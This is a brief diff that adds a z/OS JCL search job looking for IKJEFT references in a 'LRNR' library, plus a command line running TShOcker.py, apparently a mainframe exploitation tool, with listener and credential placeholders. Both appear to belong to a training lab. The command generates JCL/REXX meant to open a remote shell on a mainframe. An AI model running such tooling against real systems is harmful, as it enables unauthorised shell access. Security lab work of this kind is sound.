@@ -1,0 +1,12 @@
+//<<JOBCARD>>
+//SEARCH  EXEC PGM=ISRSUPC,
+//            PARM='SRCHCMP,ANYC'
+//NEWDD  DD DISP=SHR,DSN=LRNR.JCLLIB
+//OUTDD  DD SYSOUT=*
+//SYSIN  DD *
+SRCHFOR  'IKJEFT'
+/*
+
+###########################################
+
+python2 ./TShOcker.py -p 993 -l --lport <choose a port 40000-40030> --print r105 USERNAME PASSWORD > ./JCL_REXX
